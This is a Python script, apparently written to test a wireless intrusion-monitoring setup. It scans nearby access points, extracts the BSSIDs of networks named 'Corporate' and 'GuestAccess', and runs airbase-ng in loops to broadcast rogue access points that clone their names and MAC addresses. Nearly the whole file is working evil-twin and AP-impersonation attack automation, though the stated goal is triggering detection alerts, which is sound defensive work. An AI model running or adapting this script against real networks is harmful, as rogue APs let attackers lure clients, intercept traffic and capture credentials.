#! /usr/bin/python

import os
import subprocess
import sys

'''
This script is designed to automate generating the wireless attack alerts and measure monitoring capabilities. The script will use the wireless NIC to scan for wireless targets and save the results to a txt file. After it will use AWK to organize the data, put the corresponding BSSID's of each target AP into separate text files and then run airbase-ng on each target AP in a manner to generate the alerts EWS monitors.
'''

def wireless_targets():
# This method is designed to gather wireless AP's and parse the data so both the ESSID and BSSID are usable in the methods below.
    
    print("Scanning for wireless access points (AP's)")
    os.system("iw wlan0 scan > targets.txt")
    os.system("awk -f scan2.awk targets.txt | grep Corporate | cut -d ' ' -f1 > corporate_APs.txt")
    os.system("awk -f scan2.awk targets.txt | grep GuestAccess | cut -d ' ' -f1 > guestaccess_APs.txt")
    print("Wireless targets have been scanned.")
    
def attack_multi_tenancy():
# This condition is met when an attacker creates an Access Point with the same BSSID or ESSID as an EWS BSSID or ESSID and they're active simultaneously. For example: employee_device, Corporate, or Guest or their respective MAC address (BSSID).

    print("The Multi-tenancy Attacks are being launched for each BSSID and ESSID's 'Corporate' and 'GuestAccess'... >:)\n")
    proc = subprocess.Popen(['nohup', 'airbase-ng', '-e', 'Corporate', '-Z' '4', '-s', 'wlan0'], stdout=subprocess.PIPE)
    pid_ = proc.pid
    os.system("sleep 4m")
    proc.kill()
    proc = subprocess.Popen(['nohup', 'airbase-ng', '-e', 'GuestAccess', 'wlan0'], stdout=subprocess.PIPE)
    pid_ = proc.pid
    os.system("sleep 4m")
    proc.kill()
    print("Launching multi-tenancy attack with different ESSID from an Early Warning AP, but with matching BSSID (MAC address)... >:)\n")
    infile = open('corporate_APs.txt', 'r')
    for line in infile:
        MAC = line
        proc = subprocess.Popen(['nohup', 'airbase-ng', '-e', 'earlywarning_WiFi', '-a', MAC, '-Z' '4', '-s', 'wlan0'], stdout=subprocess.PIPE)
        pid_ = proc.pid
        os.system("sleep 3m")
        proc.kill()
        os.system("sleep 2s")
    infile.close()
    print("Almost done...\n")
    infile2 = open('guestaccess_APs.txt', 'r')
    for line in infile2:
        MAC = line
        proc = subprocess.Popen(['nohup', 'airbase-ng', '-e', 'earlywarning_WiFi', '-a', MAC, 'wlan0'], stdout=subprocess.PIPE)
        pid_ = proc.pid
        os.system("sleep 3m")
        proc.kill()
        os.system("sleep 2s")
    infile2.close()
    print("The process has been killed. The multi-tenancy attacks are now complete.\n")


def attack_ap_spoofing_and_impersonation():
# This method generates both the AP spoofing and Impersonation alerts in Splunk by creating an Access Point with the same ESSID and BSSID as an EWS AP and is "pretending" to be an EWS AP by the name it broadcasts.
    
    print("The AP spoofing and Impersonation attack is being launched against ESSID 'Corporate' with all the captured Corporate BSSID's... >:)\n")
    infile = open('corporate_APs.txt', 'r')
    for line in infile:
        MAC = line
        proc = subprocess.Popen(['nohup', 'airbase-ng', '-e', 'Corporate', '-a', MAC, '-Z' '4', '-s', 'wlan0'], stdout=subprocess.PIPE)
        pid_ = proc.pid
        os.system("sleep 3m")
        proc.kill()
        os.system("sleep 2s")
    infile.close()
    print("The process has been killed. The attacks are now complete. Will start again at the next cycle.")


def cleanup():
    os.system('rm targets.txt corporate_APs.txt guestaccess_APs.txt')
    os.system('ifconfig wlan0 down;sleep 20s;ifconfig wlan0 up')


def main():
    wireless_targets()
    attack_multi_tenancy()
    attack_ap_spoofing_and_impersonation()
    cleanup()
	

if __name__ == "__main__": main()	
	
	
